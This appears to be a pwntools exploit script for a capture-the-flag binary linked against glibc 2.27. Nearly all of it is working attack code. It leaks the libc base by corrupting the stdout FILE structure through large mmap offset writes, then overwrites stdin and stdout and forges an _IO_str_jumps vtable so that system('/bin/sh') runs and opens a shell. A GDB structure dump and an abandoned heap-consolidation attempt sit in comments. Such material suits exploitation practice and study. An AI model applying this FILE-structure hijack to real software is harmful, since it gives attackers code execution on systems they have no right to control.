from pwn import *
import sys

context.clear(arch='amd64', os='linux', aslr=False)
# context.terminal = ['tmux', 'splitw', '-h']
# context.log_level = 'debug'


argv = sys.argv
binary_path = './chall'
REMOTE = 'remote' in argv
DEBUG = 'debug' in argv

sh = process([binary_path], env={'LD_PRELOAD': './libc-2.27.so'})
libc = ELF('./libc-2.27.so')

def get_base_address():
  return int(open("/proc/{}/maps".format(sh.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug():
	libc_base = get_base_address()
	script = """
	dir ./glibc-2.27/libio
	dir ./glibc-2.27/sysdeps/unix/sysv/linux
	"""
	script += 'b *0x0000155554fbaec8'

	gdb.attach(sh ,gdbscript=script)


e = ELF(binary_path)


# ------------- plan -----------
# overwrite with null byte stdout - read_end & write_base -> get leak

def add(alloc_size, offset, data, quiet=False):
	if quiet:
		sh.sendline('1')
		sh.sendline(str(alloc_size))
		sh.sendline(str(offset))
		sh.sendline(data)
	else:
		sh.sendlineafter('> ', '1')
		sh.sendlineafter('alloc size: ', str(alloc_size))
		sh.sendlineafter('read size: ', str(offset))
		sh.sendlineafter('data: ', data)


# mmap threash hold - 128 * 1024
large_malloc_chunk = 8 * 1024 * 1024

stdout_ptr_end_off = 12506977
stdout_write_base_off = 20899697
stdin_buf_base_off = 29289001

# overwrite stdout read_end
add(large_malloc_chunk, stdout_ptr_end_off, 'Y')


# overwrite stdout write_base
add(large_malloc_chunk, stdout_write_base_off, 'Y', quiet=True)

# get leak
leak = u64(sh.recvline()[0x8: 0x10])
libc.address = leak - 0x3ed8b0
stdout = libc.sym['_IO_2_1_stdout_']
stdin = libc.sym['_IO_2_1_stdin_']
binsh = next(libc.search('/bin/sh\x00'))
lock = libc.sym['_IO_stdfile_1_lock']
wide_data = libc.sym['_IO_wide_data_1']

log.info('leak: {}'.format(hex(leak)))
log.info('libc base: {}'.format(hex(libc.address)))
log.info('stdout: {}'.format(hex(stdout)))
log.info('stdin: {}'.format(hex(stdin)))
log.info('binsh: {}'.format(hex(binsh)))

# overwrite buf start of stdin to overwrite the struct itself
add(large_malloc_chunk, stdin_buf_base_off, 'Y')

# overwrite 0x84 bytes from the start of stdin struct
# set buf start address to stdout so we could overwrite its structure
payload = ''
payload += p64(0xfbad208b) # flags
payload += p64(stdin) # read_ptr, something valid
payload += p64(0) * 5 # read_end, read_base, write_base, write_ptr, write_end
payload += p64(stdout) # buf_base
payload += p64(stdout + 0x200) # buf end
payload = payload.ljust(0x84, '\x00')

if DEBUG:
	debug()

# force another 'fgets' because read_end(0) - read_ptr(some valid pointer) <= 0
sh.send(payload)

# overwriting stdout structure
fake = p64(0xfbad2887 & (~1)) # flags & ~IO_USER_BUF
fake += p64(stdout) * 4 # read_ptr to write_base 

# write_ptr - write_base >= buf_end - buf_base + flush_only ( 0 / 1)
# binsh(random) - stdout >= (binsh - 100) // 2 -> checked with GDB
fake += p64(binsh) # write_ptr
fake += p64(0) # write_end

# 2 * (buf_end - buf_base) + 100 = addrof(binsh)
fake += p64(0) # buf_base
fake += p64((binsh - 100) // 2) # buf_end

fake += p64(0) * 4 # save_base, backup_base, save_end, markers
fake += p64(stdin) # chain
fake += p64(1) # fileno + flags2
fake += p64(0xffffffffffffffff) # old_offset
fake += p16(0) # cur_culumn
fake += p8(0)# vtable_offset
fake += b'\n' # shortbuf
fake += p32(0) # padding 
fake += p64(lock) # lock
fake += p64(0xffffffffffffffff) # offset 
fake += p64(0) # codecvt
fake += p64(wide_data) # wide_data
fake += p64(0)  * 2 # freers_list, freeers_buf
fake += p64(0) # __pad5
fake += p32(0xffffffff) # _mode
fake += b'\x00' * 20 # unused
fake += p64(libc.sym['_IO_str_jumps']) #vtable
fake += p64(libc.sym['system']) #alloc type
fake += p64(stdout) #free type

sh.sendline(fake)

sh.interactive() 	

'''
$3 = {
  file = {
    _flags = 0xfbad2887, 
    _IO_read_ptr = 0x7ffff7dd07e3 <_IO_2_1_stdout_+131> "\n", 
    _IO_read_end = 0x7ffff7dd07e3 <_IO_2_1_stdout_+131> "\n", 
    _IO_read_base = 0x7ffff7dd07e3 <_IO_2_1_stdout_+131> "\n", 
    _IO_write_base = 0x7ffff7dd07e3 <_IO_2_1_stdout_+131> "\n", 
    _IO_write_ptr = 0x7ffff7dd07e3 <_IO_2_1_stdout_+131> "\n", 
    _IO_write_end = 0x7ffff7dd07e3 <_IO_2_1_stdout_+131> "\n", 
    _IO_buf_base = 0x7ffff7dd07e3 <_IO_2_1_stdout_+131> "\n", 
    _IO_buf_end = 0x7ffff7dd07e4 <_IO_2_1_stdout_+132> "", 
    _IO_save_base = 0x0, 
    _IO_backup_base = 0x0, 
    _IO_save_end = 0x0, 
    _markers = 0x0, 
    _chain = 0x7ffff7dcfa00 <_IO_2_1_stdin_>, 
    _fileno = 0x1, 
    _flags2 = 0x0, 
    _old_offset = 0xffffffffffffffff, 
    _cur_column = 0x0, 
    _vtable_offset = 0x0, 
    _shortbuf = "\n", 
    _lock = 0x7ffff7dd18c0 <_IO_stdfile_1_lock>, 
    _offset = 0xffffffffffffffff, 
    _codecvt = 0x0, 
    _wide_data = 0x7ffff7dcf8c0 <_IO_wide_data_1>, 
    _freeres_list = 0x0, 
    _freeres_buf = 0x0, 
    __pad5 = 0x0, 
    _mode = 0xffffffff, 
    _unused2 = '\000' <repeats 19 times>
  }, 
  vtable = 0x7ffff7dcc2a0 <_IO_file_jumps>
'''











'''
def add(alloc_size, read_size, data):
	sh.sendlineafter('> ', '1')
	sh.sendlineafter('alloc size: ', str(alloc_size))
	sh.sendlineafter('read size: ', str(read_size))
	sh.sendafter('data: ', data)

chunk_to_argv = (-1) * 0x00002aaaaa8a5077

# allocate big chunk and unset prev-in-use of top chunk
data = 'A' * 8 + 'B' * 8 + 'C' * (134000 - 16  - 8) + p64(number= chunk_to_argv, sign= 'signed')
print data
add(134000, 134009, data)

# fake fd abd bk for chunk B
size = 0x250 # sizeof top chunk is 0x200, need something bigger to cause consolidation
payload = ('A' * 8 + 'B' * 8).ljust(0x248, '\x00') + p64(number= chunk_to_argv, sign= 'signed')
add(size, 120, payload) # random read number



add(100, 100, 'AAA')

add(100, 100, 'BBB')
'''